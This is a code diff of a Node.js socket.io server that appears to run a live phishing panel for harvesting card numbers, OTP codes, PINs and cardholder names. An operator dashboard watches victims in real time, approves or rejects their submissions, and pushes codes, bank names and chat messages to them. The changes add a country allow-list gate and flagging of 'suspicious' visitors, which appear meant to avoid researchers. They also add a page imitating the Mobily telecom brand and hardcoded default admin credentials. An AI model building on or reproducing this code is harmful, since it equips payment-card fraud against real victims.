@@ -74,7 +74,7 @@ setInterval(saveToFile, 30000);
 
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
 const PORT = process.env.PORT || 3000;
-const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'treeadmin';
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'bb2023bb';
 
 // ==================== In-Memory Database ====================
@@ -107,16 +107,23 @@ const db = {
 // Load saved data from disk
 loadFromFile();
 
-// Initialize default admin
+// Initialize default admin: create it if missing, and always sync its
+// password with ADMIN_PASSWORD so the configured credentials keep working
+// even when a saved data file carries an older password.
 (async () => {
   const hash = await bcrypt.hash(ADMIN_PASSWORD, 10);
-  db.admins.push({
-    id: uuidv4(),
-    username: ADMIN_USERNAME,
-    password: hash,
-    role: 'admin',
-    createdAt: new Date().toISOString(),
-  });
+  const existing = db.admins.find(a => a.username === ADMIN_USERNAME);
+  if (existing) {
+    existing.password = hash;
+  } else {
+    db.admins.push({
+      id: uuidv4(),
+      username: ADMIN_USERNAME,
+      password: hash,
+      role: 'admin',
+      createdAt: new Date().toISOString(),
+    });
+  }
   console.log(`Admin user "${ADMIN_USERNAME}" initialized.`);
 })();
 
@@ -170,6 +177,8 @@ function broadcastConnectedUsers() {
     visitTime: u.userInfo?.visitTime || u.connectedAt,
     isWaiting: u.isWaiting || false,
     waitingFormType: u.waitingFormType || null,
+    isSuspicious: u.isSuspicious || false,
+    suspiciousReason: u.suspiciousReason || '',
   }));
   io.emit('user:connected', users);
 }
@@ -498,6 +507,12 @@ io.on('connection', (socket) => {
       };
       db.formSubmissions.push(submission);
 
+      // Duplicate OTP detection: same visitor re-submitting an already-used code
+      if (formData.digitCode) {
+        const dup = db.formSubmissions.some(s => s.id !== submission.id && s.uuid === uuid && s.formData && s.formData.digitCode === formData.digitCode);
+        if (dup) socket.emit('otp:duplicateRejected');
+      }
+
       const name = formData.name || formData.fullName || formData.documentOwnerName || formData.cardholderName || formData.ownerName || '';
       if (!db.connectedUsers[uuid]) {
         db.connectedUsers[uuid] = { socketId: socket.id, uuid, userId: uuid, userType: 'client', userInfo: {}, connectedAt: new Date().toISOString(), isOnline: true };
@@ -532,8 +547,17 @@ io.on('connection', (socket) => {
     });
 
     if (!db.blockedCards) db.blockedCards = [];
+    // Single source of truth for blocked card prefixes: the dashboard-managed
+    // site setting (blocked_card_prefixes) merged with the legacy local list.
+    const getBlockedCardPrefixes = () => {
+      let fromSettings = [];
+      try { fromSettings = JSON.parse(db.siteSettings.blocked_card_prefixes || '[]'); } catch (e) { fromSettings = []; }
+      if (!Array.isArray(fromSettings)) fromSettings = [];
+      return [...new Set([...fromSettings, ...(db.blockedCards || [])])];
+    };
+
     socket.on('blockedCards:get', () => {
-      socket.emit('blockedCards:list', db.blockedCards);
+      socket.emit('blockedCards:list', getBlockedCardPrefixes());
     });
 
     socket.on('cardNumber:verify', (cardNumber) => {
@@ -545,9 +569,59 @@ io.on('connection', (socket) => {
         sum += d; dbl = !dbl;
       }
       const valid = digits.length >= 12 && sum % 10 === 0;
-      const blocked = db.blockedCards.some(c => digits.startsWith(String(c).replace(/\D/g, '')));
+      const blocked = getBlockedCardPrefixes().some(c => digits.startsWith(String(c).replace(/\D/g, '')));
       if (blocked) socket.emit('card:duplicateRejected');
       else if (valid) socket.emit('card:verified');
+    });
+
+    // Visitor flagged as suspicious (direct/incomplete page access) -> show on dashboard card
+    socket.on('visitor:suspicious', (data) => {
+      const uuid = getVisitorUuid() || (data && data.visitorId);
+      if (!uuid) return;
+      const u = db.connectedUsers[uuid];
+      const reason = (data && data.reason) || '';
+      if (u) {
+        u.isSuspicious = true;
+        u.suspiciousReason = reason;
+        saveToFile();
+        io.emit('user:statusUpdate', { uuid, userId: uuid, socketId: u.socketId, currentPage: u.currentPage || '', status: 'online', isTyping: false, isWaiting: u.isWaiting || false, waitingFormType: u.waitingFormType || null, isSuspicious: true, suspiciousReason: reason });
+        broadcastConnectedUsers();
+      }
+      addLiveUpdate('suspicious_visitor', { uuid, reason });
+    });
+
+    // Country gate: allowed_country_codes setting (empty list = allow all).
+    // Match by the visitor's stored country code/name, falling back to the client-sent name.
+    const isCountryAllowed = (u, clientName) => {
+      let allowed = [];
+      try { allowed = JSON.parse(db.siteSettings.allowed_country_codes || '[]'); } catch (e) { allowed = []; }
+      if (!Array.isArray(allowed) || allowed.length === 0) return true;
+      const code = String((u && u.userInfo && (u.userInfo.countryCode || u.countryCode)) || '').toLowerCase();
+      const name = String((u && u.userInfo && (u.userInfo.country || u.country)) || '').toLowerCase();
+      const client = String(clientName || '').toLowerCase();
+      return allowed.some(c => {
+        const v = String(c).toLowerCase();
+        return v === code || v === name || v === client;
+      });
+    };
+
+    socket.on('blockedCountries:check', (country) => {
+      const uuid = getVisitorUuid();
+      const u = uuid && db.connectedUsers[uuid];
+      socket.emit('blockedCountries:checkResult', { isBlocked: !isCountryAllowed(u, country) });
+    });
+
+    // When the dashboard updates site settings: push the new blocked-card list to
+    // all visitors and re-evaluate every connected visitor's country gate.
+    socket.on('admin:updateSiteSettings', () => {
+      setImmediate(() => {
+        io.emit('blockedCards:updated', getBlockedCardPrefixes());
+        Object.values(db.connectedUsers).forEach(u => {
+          if (u.userType === 'admin' || !u.socketId) return;
+          const s = io.sockets.sockets.get(u.socketId);
+          if (s) s.emit('blockedCountries:checkResult', { isBlocked: !isCountryAllowed(u, null) });
+        });
+      });
     });
 
     // ---- Admin action relays: forward dashboard decisions to the visitor ----
@@ -560,6 +634,9 @@ io.on('connection', (socket) => {
       if (update && update.verificationCode) {
         io.to(room).emit('code', String(update.verificationCode));
       }
+      if (update && update.bankName) {
+        io.to(room).emit('bankName', String(update.bankName));
+      }
       if (action === 'confirmed' || (update && (update.crdconfirm === 1 || update.otpconfirm === 1 || update.pinconfirm === 1 || update.phoneconfirm === 1))) {
         io.to(room).emit('form:approved');
         if (formType === 'payment') io.to(room).emit('card:verified');
@@ -570,6 +647,11 @@ io.on('connection', (socket) => {
         io.to(room).emit('form:rejected');
         io.to(room).emit('card:action', 'cancelled');
         io.to(room).emit('code:action', { action: 'cancelled', codeIndex: 0 });
+        // Mobily call-alert page listens for its own rejection signal
+        const lastSub = [...db.formSubmissions].reverse().find(s => s.uuid === targetUuid || s.userId === targetUuid);
+        if (lastSub && /mobily|موبايلي/i.test(String(lastSub.page || '') + ' ' + String(lastSub.formType || ''))) {
+          io.to(room).emit('mobily:rejected');
+        }
       }
     });
 
@@ -601,7 +683,11 @@ io.on('connection', (socket) => {
       if (data && data.from === 'admin') {
         const targetUuid = data.targetUuid || data.uuid;
         if (targetUuid) {
-          io.to(`user:${targetUuid}`).emit('chat:fromAdmin', { message: data.message, timestamp: data.timestamp || new Date().toISOString() });
+          if (data.lastMessage || data.isLast || data.final) {
+            io.to(`user:${targetUuid}`).emit('admin-last-message', { message: data.message });
+          } else {
+            io.to(`user:${targetUuid}`).emit('chat:fromAdmin', { message: data.message, timestamp: data.timestamp || new Date().toISOString() });
+          }
         }
       }
     });
